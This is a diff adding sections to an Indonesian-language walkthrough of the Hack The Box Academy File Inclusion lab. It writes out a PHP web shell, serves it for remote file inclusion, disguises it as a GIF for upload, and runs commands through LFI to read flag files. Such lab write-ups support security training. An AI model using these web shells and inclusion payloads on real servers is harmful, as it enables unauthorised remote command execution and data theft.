@@ -179,3 +179,102 @@ http://ip:port/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR
 ```sh
 HTB{***}
 ```
+
+## Remote File Inclusion (RFI)
+- Jalankan web target terlebih dahulu
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2029.JPG)
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2030.JPG)
+
+- **Question:**  Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /
+- Buat sebuah file `shell.php` dengan perintah sebagai berikut
+```sh
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2031.JPG)
+
+- Serving menggunkan python3
+```sh
+sudo python3 -m http.server 80
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2032.JPG)
+
+- Akses URL berikut ini di browser
+```sh
+http://ip/index.php?language=http://ip_tun0/shell.php&cmd=id
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2033.JPG)
+
+- Jika kita masukkan perintah `ls /` pada parameter cmd akan tampil nama folder `exercise`
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2034.JPG)
+
+- Didalam folder `exercise` ternyata terdapat file `flag.txt`
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2035.JPG)
+
+- Baca isi file tersebut dengan URL dibawah ini
+```sh
+http://ip/index.php?language=http://ip_tun0/shell.php&cmd=cat%20/exercise/flag.txt
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2036.JPG)
+
+- **Answer**
+```sh
+masukkan hash
+```
+
+## LFI and File Uploads
+- Jalankan web target terlebih dahulu
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2037.JPG)
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2038.JPG)
+
+- **Question:** Use any of the techniques covered in this section to gain RCE and read the flag at /
+- Buat file gambar yang berisi web shell
+```sh
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2039.JPG)
+
+- Akses URL `http://ip:port/settings.php` di browser untuk mengunggah file gambar `shell.gif` yang sudah dibuat
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2040.JPG)
+
+- Klik foto profil untuk memilih foto profil dan tekan tombol **Upload** untuk mengunggah file
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2041.JPG)
+
+- Setelah file gambar berhasil diunggah tekan `Ctrl+U` untuk membuka source code halaman. Di sini dapat dilihat bahwa foto profil disimpan di direktori `/profile_images`
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2042.JPG)
+
+- Akses URL sebagai berikut untuk menguji coba RCE
+```sh
+http://ip:port/index.php?language=./profile_images/shell.gif&cmd=id
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2043.JPG)
+
+- Jika kita masukkan perintah `ls /` pada parameter cmd akan ditemukan nama file yang kemungkinan berisi sebuah flag
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2044.JPG)
+
+- Sekarang coba buka isi file tersebut menggunakan perintah `cat /nama_file` melalui URL
+```sh
+http://ip:port/index.php?language=./profile_images/shell.gif&cmd=cat%20/nama_file
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2045.JPG)
+
+- **Answer**
+```sh
+HTB{***}
+```
